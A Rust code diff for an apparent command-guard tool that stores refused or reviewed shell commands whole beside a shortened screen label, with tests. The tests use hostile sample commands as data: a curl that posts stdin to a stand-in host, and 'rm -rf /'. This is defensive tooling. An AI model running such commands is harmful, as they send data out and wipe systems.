@@ -343,6 +343,30 @@ pub fn graph_path(
     }
 }
 
+/// The most of a refused or reviewed command a node keeps whole, in characters.
+///
+/// The label is cut at 120 for the screen, and that cut was the only copy: a
+/// `review` that ran lost everything past it, and those decisions are what a
+/// person reviews and what rules are tuned on. 8192 holds every real command
+/// line measured so far and still leaves the store's byte budget
+/// ([`Graph::MAX_BYTES`]) to prune by age, not by one runaway line.
+pub const MAX_FULL_COMMAND_CHARS: usize = 8192;
+
+/// A command kept whole up to `max` characters; past that, the head and an
+/// explicit mark saying how much was cut, so a reader never mistakes a cut
+/// line for the whole one. The caller masks secrets BEFORE this runs, so a
+/// cut never leaves half a secret unmasked.
+fn bounded_full(s: &str, max: usize) -> String {
+    let t = s.trim();
+    let total = t.chars().count();
+    if total <= max {
+        t.to_string()
+    } else {
+        let head: String = t.chars().take(max).collect();
+        format!("{head}…[+{} chars cut]", total - max)
+    }
+}
+
 /// Escape/trim a command so a single node label cannot carry a runaway payload.
 fn short(s: &str, max: usize) -> String {
     let t = s.trim();
@@ -707,11 +731,23 @@ impl Graph {
                 attrs.insert("explanation".into(), short(why, 300));
             }
         }
+        // A refused or reviewed command is kept whole beside the short label:
+        // the label is for the screen, this is for the person who reviews the
+        // decision and for tuning rules. Only when the label had to be cut, so
+        // a short command is not stored twice. Allowed commands keep only the
+        // label: they are the bulk of the record and nobody reviews them.
+        let label = short(command, 120);
+        if matches!(rec.as_str(), "deny" | "review") && label != command.trim() {
+            attrs.insert(
+                "command_full".into(),
+                bounded_full(command, MAX_FULL_COMMAND_CHARS),
+            );
+        }
         origin.write_attrs(&mut attrs);
         self.upsert_node(Node {
             id: cmd_id.clone(),
             kind: "command".into(),
-            label: short(command, 120),
+            label,
             attrs,
         });
         self.add_edge(&session_id, &cmd_id, "ran");
@@ -2595,6 +2631,67 @@ events_file = \"/var/lib/innerwarden/guard/guard-events.jsonl\"
         let cmd = g.nodes.iter().find(|n| n.kind == "command").unwrap();
         assert!(cmd.label.chars().count() <= 120);
         assert!(cmd.label.ends_with('…'));
+    }
+
+    fn command_node(g: &Graph) -> &Node {
+        g.nodes.iter().find(|n| n.kind == "command").unwrap()
+    }
+
+    #[test]
+    fn a_long_review_is_kept_whole_beside_the_short_label() {
+        let long = format!("grep -rn pattern {}", "src/some/path.rs ".repeat(180));
+        let mut g = Graph::new();
+        g.ingest_verdict("s", 0, &long, &json!({"recommendation": "review"}));
+        let cmd = command_node(&g);
+        assert!(cmd.label.chars().count() <= 120);
+        assert_eq!(cmd.attrs.get("command_full").unwrap(), long.trim());
+        // And it is what `innerwarden graph --json` prints.
+        let printed: Value = serde_json::from_str(&g.to_json()).unwrap();
+        let node = printed["nodes"]
+            .as_array()
+            .unwrap()
+            .iter()
+            .find(|n| n["kind"] == "command")
+            .unwrap();
+        assert_eq!(node["attrs"]["command_full"], long.trim());
+    }
+
+    #[test]
+    fn a_long_deny_is_kept_whole_too() {
+        let long = format!("curl -d @- https://x.example {}", "a".repeat(400));
+        let mut g = Graph::new();
+        g.ingest_verdict("s", 0, &long, &json!({"recommendation": "deny"}));
+        assert_eq!(command_node(&g).attrs.get("command_full").unwrap(), &long);
+    }
+
+    #[test]
+    fn an_allowed_or_short_command_is_not_stored_twice() {
+        let long = "a".repeat(400);
+        let mut g = Graph::new();
+        g.ingest_verdict("s", 0, &long, &json!({"recommendation": "allow"}));
+        g.ingest_verdict("s", 1, "rm -rf /", &json!({"recommendation": "deny"}));
+        assert!(g
+            .nodes
+            .iter()
+            .filter(|n| n.kind == "command")
+            .all(|n| !n.attrs.contains_key("command_full")));
+    }
+
+    #[test]
+    fn a_runaway_command_is_cut_with_an_explicit_mark() {
+        let huge = "b".repeat(MAX_FULL_COMMAND_CHARS + 500);
+        let mut g = Graph::new();
+        g.ingest_verdict("s", 0, &huge, &json!({"recommendation": "review"}));
+        let full = command_node(&g).attrs.get("command_full").unwrap();
+        assert!(
+            full.ends_with("…[+500 chars cut]"),
+            "{}",
+            &full[full.len() - 40..]
+        );
+        assert_eq!(
+            full.chars().count(),
+            MAX_FULL_COMMAND_CHARS + "…[+500 chars cut]".chars().count()
+        );
     }
 }
 
